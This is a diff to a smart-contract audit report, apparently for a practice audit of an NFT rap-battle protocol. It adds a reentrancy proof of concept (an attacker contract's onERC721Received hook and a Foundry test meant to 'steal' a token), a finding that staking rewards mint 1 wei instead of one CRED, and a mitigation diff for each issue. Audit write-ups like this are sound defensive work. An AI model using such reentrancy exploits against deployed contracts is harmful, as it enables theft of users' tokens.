@@ -140,17 +140,123 @@ This flaw allows attackers to exploit the system by creating a contract specific
 
 **Impact:** Users can mint rapper NFTs that are having higher skills than default.
 
-
-
-**Impact:**
 **Proof Of Concept:**
+
+Attacker Contract: Add this to your test suite
+
+```solidity
+ function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        console.log("Current token Id is:",oneShot.getNextTokenId());
+        uint256 challengerRapperSkill = rapBattle.getRapperSkill(1);
+        // This is supposed to be 50, but it is 65 now
+        require(challengerRapperSkill == 65, "PoC failed");
+        console.log("challengerRapperSkill: ", challengerRapperSkill);        
+        rapBattle.goOnStageOrBattle(1, rapBattle.defenderBet());
+        return 0x150b7a02;
+    }
+```
+
+Also add the below test to your test suite: 
+
+```solidity
+function testPoCReentrancys() public {
+        // user staking for 4 days
+        vm.startPrank(user);
+        oneShot.mintRapper(); // _tokenId == 0
+        oneShot.approve(address(streets), 0);
+        streets.stake(0);
+        vm.stopPrank();
+
+        vm.warp(1 days + 1);
+        vm.startPrank(user);
+        streets.unstake(0);
+        oneShot.approve(address(rapBattle), 0);
+        cred.approve(address(rapBattle), 1);
+        rapBattle.goOnStageOrBattle(0, 1);
+        vm.stopPrank();
+
+        // challenger battle and steal token
+        vm.startPrank(challenger);
+        AttackContract attackContract = new AttackContract(address(rapBattle), address(oneShot));
+        attackContract.pwn();
+        vm.stopPrank();
+    }
+```
+**Recommended Mitigation:** Follow the check, effects and interactions patterns
+
+```diff
+function mintRapper() public {
+        uint256 tokenId = _nextTokenId++;
+-        _safeMint(msg.sender, tokenId);
+
+        // Initialize metadata for the minted token
+        rapperStats[tokenId] =
+            RapperStats({weakKnees: true, heavyArms: true, spaghettiSweater: true, calmAndReady: false, battlesWon: 0});
++       _safeMint(msg.sender, tokenId);
+
+    }
+```
+
+### [M-2] `Streets::unstake()` mints incorrect amount of tokens for users as reward resulting in users reciving very negligble amount of tokens as Rewards.
+
+**Description:** In `Streets::unstake()` , the conditionals statements mints only 1 unit of the token instead of one full token. The `CRED` token is an ERC20 contract with 18 decimals, therefore `1` CRED token is considered equivalent to 10^18 as additional 18 zeroes are used for representing the floating values. 
+
+The protocol mentions to mint `1` CRED token per day staked for a maximum of 4 days, therefore the equivalent amount of CRED token to mint by considering the decimals in solidity will be 10^18 but it only mints `0.000000000000000001`. Therefore, users get very negligible amount of `CRED` token.
+
+```solidity
+  
+if (daysStaked >= 1) {
+            stakedRapperStats.weakKnees = false;
+@>            credContract.mint(msg.sender, 1); 
+        }
+        if (daysStaked >= 2) {
+            stakedRapperStats.heavyArms = false;
+@>              credContract.mint(msg.sender, 1); 
+        }
+        if (daysStaked >= 3) {
+            stakedRapperStats.spaghettiSweater = false;
+@>              credContract.mint(msg.sender, 1); 
+        } 
+        if (daysStaked >= 4) {
+            stakedRapperStats.calmAndReady = true; 
+@>              credContract.mint(msg.sender, 1); 
+        }
+
+```
+
+**Impact:** Users are reciveing very negligible amount of token.
+ 
 **Recommended Mitigation:**
 
-### [M-2]
-**Description:**
-**Impact:**
-**Proof Of Concept:**
-**Recommended Mitigation:**
+Tokens should be minted by taking the 18 decimals into consideration then only it will be equivalent to `1` CRED token.
+
+```diff
+    if (daysStaked >= 1) {
+            stakedRapperStats.weakKnees = false;
+-           credContract.mint(msg.sender, 1);
++           credContract.mint(msg.sender, 1e18);
+        }
+        if (daysStaked >= 2) {
+            stakedRapperStats.heavyArms = false;
+-           credContract.mint(msg.sender, 1);
++           credContract.mint(msg.sender, 1e18);
+        }
+        if (daysStaked >= 3) {
+            stakedRapperStats.spaghettiSweater = false;
+-           credContract.mint(msg.sender, 1);
++           credContract.mint(msg.sender, 1e18);
+        }
+        if (daysStaked >= 4) {
+            stakedRapperStats.calmAndReady = true;
+-           credContract.mint(msg.sender, 1);
++           credContract.mint(msg.sender, 1e18);
+        }
+```
 
 # Low
 
